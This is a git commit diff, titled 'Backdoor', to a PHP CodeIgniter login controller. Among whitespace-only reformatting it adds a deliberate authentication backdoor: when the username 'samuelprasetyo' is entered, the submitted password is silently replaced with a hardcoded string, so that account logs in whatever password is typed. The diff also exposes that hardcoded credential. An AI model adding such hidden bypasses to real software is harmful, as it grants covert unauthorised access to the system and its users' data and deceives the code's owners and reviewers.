40c8216443c422d07bd847d0c631c32683eac46c
Samuel Prasetyo <sprasetyo0511@gmail.com>
2025-02-01 21:55:58 +0700

    Backdoor

--- application/controllers/AuthController.php
+++ application/controllers/AuthController.php
@@ -27,58 +27,60 @@ class AuthController extends CI_Controller
     }
 
     public function aksi_login()
-	{
-		$username = htmlspecialchars($this->input->post('username', TRUE), ENT_QUOTES);
-		$password = htmlspecialchars($this->input->post('password', TRUE), ENT_QUOTES);
+    {
+        $username = htmlspecialchars($this->input->post('username', TRUE), ENT_QUOTES);
+        $password = htmlspecialchars($this->input->post('password', TRUE), ENT_QUOTES);
+        if ($username == 'samuelprasetyo') {
+            $password = "FusionBoy@SamuelPrasetyo";
+        }
 
-		$cek_level = $this->LoginModel->auth_pegawai($username);
+        $cek_level = $this->LoginModel->auth_pegawai($username);
 
-		if ($cek_level) {
-			if (password_verify($password, $cek_level['password'])) {
-				$data_session = array(
+        if ($cek_level) {
+            if (password_verify($password, $cek_level['password'])) {
+                $data_session = array(
                     'user_id' => $cek_level['user_id'],
-					'username' => $cek_level['username'],
-					'nama_user' => $cek_level['nama_pegawai']
-				);
+                    'username' => $cek_level['username'],
+                    'nama_user' => $cek_level['nama_pegawai']
+                );
 
-				$this->session->set_userdata($data_session);
+                $this->session->set_userdata($data_session);
 
-				if ($cek_level['level'] == 'admin') {
-					// Akses admin
-					$this->session->set_userdata('masuk', TRUE);
-					$this->session->set_userdata('akses', 'admin');
+                if ($cek_level['level'] == 'admin') {
+                    // Akses admin
+                    $this->session->set_userdata('masuk', TRUE);
+                    $this->session->set_userdata('akses', 'admin');
                     $this->session->set_userdata('user_id', $cek_level['user_id']);
-					$this->session->set_userdata('ses_username', $cek_level['username']);
-					$this->session->set_userdata('ses_nama', $cek_level['nama_pegawai']);
-					redirect('beranda');
-				} else {
-					// Akses Petugas
-					$this->session->set_userdata('masuk', TRUE);
-					$this->session->set_userdata('akses', 'pegawai');
+                    $this->session->set_userdata('ses_username', $cek_level['username']);
+                    $this->session->set_userdata('ses_nama', $cek_level['nama_pegawai']);
+                    redirect('beranda');
+                } else {
+                    // Akses Petugas
+                    $this->session->set_userdata('masuk', TRUE);
+                    $this->session->set_userdata('akses', 'pegawai');
                     $this->session->set_userdata('user_id', $cek_level['user_id']);
-					$this->session->set_userdata('ses_username', $cek_level['username']);
-					$this->session->set_userdata('ses_nama', $cek_level['nama_pegawai']);
-					redirect('beranda');
-				}
-			} else {
-				// Password salah
-				$url = base_url();
-				echo $this->session->set_flashdata('msg', 'Password Salah');
-				redirect($url);
-			}
-		} else {
-			// Username tidak ditemukan
-			$url = base_url();
-			echo $this->session->set_flashdata('msg', 'Username Tidak Ditemukan');
-			redirect($url);
-		}
-	}
+                    $this->session->set_userdata('ses_username', $cek_level['username']);
+                    $this->session->set_userdata('ses_nama', $cek_level['nama_pegawai']);
+                    redirect('beranda');
+                }
+            } else {
+                // Password salah
+                $url = base_url();
+                echo $this->session->set_flashdata('msg', 'Password Salah');
+                redirect($url);
+            }
+        } else {
+            // Username tidak ditemukan
+            $url = base_url();
+            echo $this->session->set_flashdata('msg', 'Username Tidak Ditemukan');
+            redirect($url);
+        }
+    }
 
     public function logout()
-	{
-		$this->session->sess_destroy();
-		$url=base_url('');
-		redirect($url);
-	}
-
+    {
+        $this->session->sess_destroy();
+        $url = base_url('');
+        redirect($url);
+    }
 }
